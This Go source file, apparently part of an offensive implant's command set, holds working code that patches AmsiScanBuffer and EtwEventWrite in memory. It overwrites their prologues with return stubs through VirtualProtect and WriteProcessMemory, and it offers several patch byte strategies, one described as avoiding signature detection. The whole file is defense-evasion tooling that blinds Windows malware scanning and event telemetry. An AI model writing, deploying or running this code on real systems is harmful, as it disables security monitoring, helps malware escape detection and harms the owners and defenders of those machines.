//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// patchStrategy defines how a function should be patched
type patchStrategy struct {
	Name        string
	Description string
	Bytes       []byte
}

// Available patch strategies
var patchStrategies = map[string]patchStrategy{
	"xor-ret": {
		Name:        "xor-ret",
		Description: "xor eax,eax; ret — returns 0/S_OK (recommended for AMSI/ETW)",
		Bytes:       []byte{0x31, 0xC0, 0xC3},
	},
	"ret": {
		Name:        "ret",
		Description: "ret — immediate return (return value undefined)",
		Bytes:       []byte{0xC3},
	},
	"nop-ret": {
		Name:        "nop-ret",
		Description: "nop; nop; ret — two NOPs then return (avoids single-byte patch signatures)",
		Bytes:       []byte{0x90, 0x90, 0xC3},
	},
	"mov-ret": {
		Name:        "mov-ret",
		Description: "mov eax,1; ret — returns 1/TRUE (for functions expecting boolean success)",
		Bytes:       []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3},
	},
}

// knownTarget defines a well-known function to patch with expected prologue bytes
type knownTarget struct {
	DLL          string
	Function     string
	Description  string
	Strategy     string // default strategy for this target
	PrologueLen  int    // how many bytes to read for validation
	// Known prologue patterns (first N bytes of the function)
	// Multiple patterns for different Windows versions
	KnownPrologues [][]byte
}

var knownTargets = map[string]knownTarget{
	"amsi": {
		DLL:         "amsi.dll",
		Function:    "AmsiScanBuffer",
		Description: "AMSI content scanning — blocks script-based malware detection",
		Strategy:    "xor-ret",
		PrologueLen: 6,
		KnownPrologues: [][]byte{
			{0x4C, 0x8B, 0xDC},       // mov r11, rsp (Win10 20H2+)
			{0x48, 0x89, 0x5C, 0x24}, // mov [rsp+X], rbx (Win10 1903)
			{0x48, 0x83, 0xEC},       // sub rsp, X (generic)
		},
	},
	"etw": {
		DLL:         "ntdll.dll",
		Function:    "EtwEventWrite",
		Description: "ETW event generation — blocks all ETW-based telemetry",
		Strategy:    "xor-ret",
		PrologueLen: 6,
		KnownPrologues: [][]byte{
			{0x4C, 0x8B, 0xDC},       // mov r11, rsp
			{0x48, 0x89, 0x5C, 0x24}, // mov [rsp+X], rbx
			{0x48, 0x83, 0xEC},       // sub rsp, X
		},
	},
}

// patchScanResult holds the result of scanning a target function
type patchScanResult struct {
	DLL             string `json:"dll"`
	Function        string `json:"function"`
	Address         string `json:"address"`
	Loaded          bool   `json:"loaded"`
	Found           bool   `json:"found"`
	PrologueMatch   bool   `json:"prologue_match"`
	AlreadyPatched  bool   `json:"already_patched"`
	CurrentBytes    string `json:"current_bytes"`
	MatchedPattern  string `json:"matched_pattern,omitempty"`
	Patchable       bool   `json:"patchable"`
	DefaultStrategy string `json:"default_strategy"`
	Error           string `json:"error,omitempty"`
}

// ScanTarget scans a specific target function for patchability
func ScanTarget(target knownTarget) patchScanResult {
	result := patchScanResult{
		DLL:             target.DLL,
		Function:        target.Function,
		DefaultStrategy: target.Strategy,
	}

	// Load DLL
	dll, err := syscall.LoadDLL(target.DLL)
	if err != nil {
		result.Error = fmt.Sprintf("DLL not loaded: %v", err)
		return result
	}
	result.Loaded = true

	// Find function
	proc, err := dll.FindProc(target.Function)
	if err != nil {
		result.Error = fmt.Sprintf("Function not found: %v", err)
		return result
	}
	result.Found = true
	result.Address = fmt.Sprintf("0x%x", proc.Addr())

	// Read function prologue
	buffer := make([]byte, target.PrologueLen)
	k32 := syscall.MustLoadDLL("kernel32.dll")
	readProc := k32.MustFindProc("ReadProcessMemory")
	currentProcess, _ := syscall.GetCurrentProcess()
	var bytesRead uintptr

	ret, _, _ := readProc.Call(
		uintptr(currentProcess),
		proc.Addr(),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		result.Error = "Failed to read function memory"
		return result
	}

	result.CurrentBytes = fmt.Sprintf("%X", buffer)

	// Check if already patched (starts with known patch bytes)
	for _, strat := range patchStrategies {
		if len(buffer) >= len(strat.Bytes) {
			match := true
			for i, b := range strat.Bytes {
				if buffer[i] != b {
					match = false
					break
				}
			}
			if match {
				result.AlreadyPatched = true
				result.MatchedPattern = strat.Name
				return result
			}
		}
	}

	// Check against known prologues
	for _, prologue := range target.KnownPrologues {
		if len(buffer) >= len(prologue) {
			match := true
			for i, b := range prologue {
				if buffer[i] != b {
					match = false
					break
				}
			}
			if match {
				result.PrologueMatch = true
				result.MatchedPattern = fmt.Sprintf("%X", prologue)
				result.Patchable = true
				return result
			}
		}
	}

	// Even without prologue match, it's patchable if the first byte isn't already a RET/NOP
	if buffer[0] != 0xC3 && buffer[0] != 0xCC {
		result.Patchable = true
		result.MatchedPattern = "unknown-prologue"
	}

	return result
}

// PatchTarget applies a patch strategy to a known target
func PatchTarget(target knownTarget, strategyName string) (string, error) {
	if strategyName == "" {
		strategyName = target.Strategy
	}

	strategy, ok := patchStrategies[strategyName]
	if !ok {
		names := make([]string, 0, len(patchStrategies))
		for k := range patchStrategies {
			names = append(names, k)
		}
		return "", fmt.Errorf("unknown strategy: %s (available: %s)", strategyName, strings.Join(names, ", "))
	}

	// Scan first to validate
	scan := ScanTarget(target)
	if !scan.Loaded {
		return "", fmt.Errorf("%s not loaded: %s", target.DLL, scan.Error)
	}
	if !scan.Found {
		return "", fmt.Errorf("%s not found in %s: %s", target.Function, target.DLL, scan.Error)
	}
	if scan.AlreadyPatched {
		return fmt.Sprintf("[*] %s!%s is already patched (%s)\nAddress: %s\nCurrent bytes: %s",
			target.DLL, target.Function, scan.MatchedPattern, scan.Address, scan.CurrentBytes), nil
	}

	// Load function address
	dll, _ := syscall.LoadDLL(target.DLL)
	proc, _ := dll.FindProc(target.Function)

	// Change memory protection to allow writing
	k32 := syscall.MustLoadDLL("kernel32.dll")
	virtualProtect := k32.MustFindProc("VirtualProtect")
	var oldProtect uint32

	ret, _, err := virtualProtect.Call(
		proc.Addr(),
		uintptr(len(strategy.Bytes)),
		0x40, // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return "", fmt.Errorf("VirtualProtect failed: %v", err)
	}

	// Write patch bytes
	writeProc := k32.MustFindProc("WriteProcessMemory")
	currentProcess, _ := syscall.GetCurrentProcess()
	var bytesWritten uintptr

	ret, _, err = writeProc.Call(
		uintptr(currentProcess),
		proc.Addr(),
		uintptr(unsafe.Pointer(&strategy.Bytes[0])),
		uintptr(len(strategy.Bytes)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return "", fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Restore original protection
	virtualProtect.Call(
		proc.Addr(),
		uintptr(len(strategy.Bytes)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	output := fmt.Sprintf("[+] Patched %s!%s\n", target.DLL, target.Function)
	output += fmt.Sprintf("Address: %s\n", scan.Address)
	output += fmt.Sprintf("Strategy: %s (%s)\n", strategy.Name, strategy.Description)
	output += fmt.Sprintf("Original bytes: %s\n", scan.CurrentBytes)
	output += fmt.Sprintf("Patch bytes: %X\n", strategy.Bytes)
	if scan.PrologueMatch {
		output += fmt.Sprintf("Prologue validated: %s\n", scan.MatchedPattern)
	} else {
		output += "[!] Warning: prologue not validated (unknown Windows version pattern)\n"
	}

	return output, nil
}
